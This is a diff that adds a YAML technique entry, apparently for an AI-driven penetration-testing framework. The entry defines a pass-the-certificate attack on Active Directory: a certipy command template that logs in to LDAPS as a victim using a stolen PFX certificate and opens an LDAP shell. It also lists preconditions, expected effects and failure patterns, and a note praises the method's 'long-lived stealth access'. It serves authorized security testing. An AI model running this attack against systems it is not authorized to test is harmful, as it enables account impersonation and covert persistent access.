@@ -1,0 +1,26 @@
+name: passthecert
+category: ad
+description: Pass-the-certificate — Schannel LDAP auth using PFX
+preconditions:
+- has_certificate
+- service.port==636
+parameters:
+  target_ip: from_engagement.target_ip
+  pfx_file: from_engagement.pfx_path
+command_template: certipy auth -pfx {pfx_file} -dc-ip {target_ip} -ldap-shell
+parser: generic_parser
+expected_effects:
+- ldap_session_as_victim
+- authenticated_as_cert_subject
+falsifier:
+  pattern: KDC_ERR|certificate not found|PFX|denied|ACCESS_DENIED
+  timeout: 30
+model_tier: sonnet
+mechanism: |
+  Once you hold a PFX cert+key for any account, authenticate to LDAPS via Schannel
+  without ever cracking a hash or using PKINIT. Useful when DC has StrongCertificate
+  BindingEnforcement preventing PKINIT but Schannel mappings remain valid; also for
+  long-lived stealth access since cert lifetimes are longer than password rotations.
+references:
+  ocd_mindmap: 'Branch 7: Pass-the-certificate (Schannel LDAP)'
+  hacktricks: windows-hardening/active-directory-methodology/ad-certificates/account-persistence.md
